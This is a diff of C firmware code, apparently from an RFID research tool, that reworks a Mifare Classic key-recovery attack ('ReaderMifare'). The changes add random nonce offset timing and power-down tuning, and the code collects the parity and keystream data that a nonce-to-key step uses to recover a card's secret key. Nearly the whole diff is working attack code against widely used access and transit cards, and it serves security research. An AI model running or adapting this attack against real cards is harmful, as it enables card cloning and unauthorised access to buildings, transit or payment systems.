@@ -1831,8 +1831,7 @@ int TuneMifare(int time)
 {
     // Mifare AUTH
     uint8_t mf_auth[]    = { 0x60,0x00,0xf5,0x7b };
-    //uint8_t mf_nr_ar[]   = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
-    uint8_t* receivedAnswer = (((uint8_t *)BigBuf) + FREE_BUFFER_OFFSET);	// was 3560 - tied to other size changes
+    uint8_t* receivedAnswer = (((uint8_t *)BigBuf) + FREE_BUFFER_OFFSET);
 
     iso14443a_setup();
     int TIME1=time;
@@ -1840,7 +1839,7 @@ int TuneMifare(int time)
     uint8_t uid[8];
     uint32_t cuid;
     byte_t nt[4];
-    Dbprintf("Tuning... testing a delay of %d ms",time);
+    Dbprintf("Tuning... testing a delay of %d ms (press button to skip)",time);
 
 
     mftest nt_values[TEST_LENGTH];
@@ -1906,7 +1905,6 @@ int TuneMifare(int time)
 #define STATE_SIZE 100
 typedef struct AttackState{
     byte_t nt[4];
-    //byte_t nt_attacked[4];
     byte_t par_list[8];
     byte_t ks_list[8];
     byte_t par;
@@ -1987,40 +1985,84 @@ void reportResults(uint8_t uid[8],AttackState *pState, int isOK)
     if (MF_DBGLEVEL >= 1)	DbpString("COMMAND mifare FINISHED");
 }
 
+void ReaderMifareBegin(uint32_t offset_time, uint32_t powerdown_time);
 
-
-
-void ReaderMifare(uint32_t parameter)
+/**
+ * @brief New implementation of ReaderMifare, the classic mifare attack.
+ *  This implementation is backwards-compatible, but has some added parameters.
+ * @param c the usbcommand in complete
+ *  c->arg[0] - nt_noattack (deprecated)
+ *  c->arg[1] - offset_time us (0 => random)
+ *  c->arg[2] - powerdown_time ms (0=> tuning)
+ *
+ */
+void ReaderMifare(UsbCommand *c)
 {
-    /**
-     *First, we tune it.
-     **/
-    int entropy = 100;
-    int time = 25;
-    entropy = TuneMifare(time);
+    /*
+     * The 'no-attack' is not used anymore, with the introduction of
+     * state tables. Instead, we use an offset which is random. This means that we
+     * should not get stuck on a 'bad' nonce, so no-attack is not needed.
+     * Anyway, arg[0] is reserved for backwards compatibility
+    uint32_t nt_noattack_uint = c->arg[0];
+    byte_t nt_noattack[4];
+    num_to_bytes(parameter, 4, nt_noattack_uint);
 
-    while(entropy > 50 && time < 2000){
-        //Increase timeout, but never more than 500ms at a time
-        time = MIN(time*2, time+500);
+     */
+    /*
+     *IF, for some reason, you want to attack a specific nonce or whatever,
+     *you can specify the offset time yourself, in which case it won't be random.
+     *
+     * The offset time is microseconds, MICROSECONDS, not ms.
+     */
+    uint32_t offset_time = c->arg[1];
+    if(offset_time == 0)
+    {
+        //[Martin:]I would like to have used rand(), but linking problems prevented it
+        //offset_time = rand() % 4000;
+        //So instead, I found this nifty thingy, which seems to fit the bill
+        offset_time = GetTickCount() % 2000;
+    }
+    /*
+     * There is an implementation of tuning. Tuning will try to determine
+     * a good power-down time, which is different for different cards.
+     * If a value is specified from the packet, we won't do any tuning.
+     * A value of zero will initialize a tuning.
+     * The power-down time is milliseconds, that MILLI-seconds .
+     */
+    uint32_t powerdown_time = c->arg[2];
+    if(powerdown_time == 0)
+    {
+        //Tuning required
+        int entropy = 100;
+        int time = 25;
         entropy = TuneMifare(time);
-    }
 
-    if(entropy > 50){
-        Dbprintf("OBS! This card has high entropy (%d) and slow power-down. This may take a while", entropy);
+        while(entropy > 50 && time < 2000){
+            //Increase timeout, but never more than 500ms at a time
+            time = MIN(time*2, time+500);
+            entropy = TuneMifare(time);
+        }
+        if(entropy > 50){
+            Dbprintf("OBS! This card has high entropy (%d) and slow power-down. This may take a while", entropy);
+        }
+        powerdown_time = time;
     }
-    Dbprintf("Using power-down-time of %d ms, entropy %d", time, entropy);
+    //The actual attack
+    ReaderMifareBegin(offset_time, powerdown_time);
+}
+void ReaderMifareBegin(uint32_t offset_time, uint32_t powerdown_time)
+{
+    Dbprintf("Using power-down-time of %d ms, offset time %d us", powerdown_time, offset_time);
 
     /**
      *Allocate our state-table and initialize with zeroes
      **/
 
-
     AttackState states[STATE_SIZE] ;
-
-
-    Dbprintf("Memory allocated ok! (%d bytes)",STATE_SIZE*sizeof(AttackState) );
+    //Dbprintf("Memory allocated ok! (%d bytes)",STATE_SIZE*sizeof(AttackState) );
     memset(states, 0, STATE_SIZE*sizeof(AttackState));
-	// Mifare AUTH
+
+    // Mifare AUTH
 	uint8_t mf_auth[]    = { 0x60,0x00,0xf5,0x7b };
 	uint8_t* receivedAnswer = (((uint8_t *)BigBuf) + FREE_BUFFER_OFFSET);	// was 3560 - tied to other size changes
 
@@ -2028,7 +2070,6 @@ void ReaderMifare(uint32_t parameter)
 	tracing = false;
 
 	iso14443a_setup();
-
 	LED_A_ON();
 	LED_B_OFF();
 	LED_C_OFF();
@@ -2037,8 +2078,6 @@ void ReaderMifare(uint32_t parameter)
 	uint8_t uid[8];
 	uint32_t cuid;
 
-    byte_t nt_noattack[4];
-    num_to_bytes(parameter, 4, nt_noattack);
     byte_t nt[4];
     int nts_attacked= 0;
     //Keeps track of progress (max value of nt_diff for our states)
@@ -2048,10 +2087,10 @@ void ReaderMifare(uint32_t parameter)
 	{
 		LED_C_OFF();
 		FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
-        SpinDelay(time);
+        SpinDelay(powerdown_time);
 		FpgaWriteConfWord(FPGA_MAJOR_MODE_HF_ISO14443A | FPGA_HF_ISO14443A_READER_MOD);
 		LED_C_ON();
-		SpinDelay(2);
+        SpinDelayUs(offset_time);
 
 		if(!iso14443a_select_card(uid, NULL, &cuid)) continue;
 
@@ -2096,9 +2135,6 @@ void ReaderMifare(uint32_t parameter)
                 high_entropy_warning_issued = 1;
             }
         }
-
-
-
         if(pState == NULL) continue;
 
         int result = continueAttack(pState, receivedAnswer);
@@ -2117,19 +2153,8 @@ void ReaderMifare(uint32_t parameter)
             //Dbprintf("Continue attack no answer, par is now %d", pState->par);
         }
         else if(result == 0){
-            //uint64_t par_list = bytes_to_num((uint8_t*)&pState->par_list, 8);
-            //uint64_t ks_list = bytes_to_num((uint8_t*)&pState->ks_list, 8);
-            //uint32_t xnt = bytes_to_num((uint8_t*)&pState->nt,4 );
-            //uint32_t xuid = (uint32_t)bytes_to_num((uint8_t*)&uid, 4);
-            //Dbprintf("\n#nuid(%08x) nt(%08x) par(%016x) ks(%016x)",xuid,xnt,par_list,ks_list);
-            //Dbprintf("\n./nonce2key %08x %08x %016x %016x\n",xuid,xnt,par_list,ks_list);
-            //Dbprintf("Finished");
             reportResults(uid,pState,1);
             return;
-            //memset(pState, 0, sizeof(AttackState));
-            //memcpy(pState->nt, nt, 4);
-            //Dbprintf("State reset for state %d!", i);
-            //return;
         }
     }
     reportResults(uid,NULL,0);
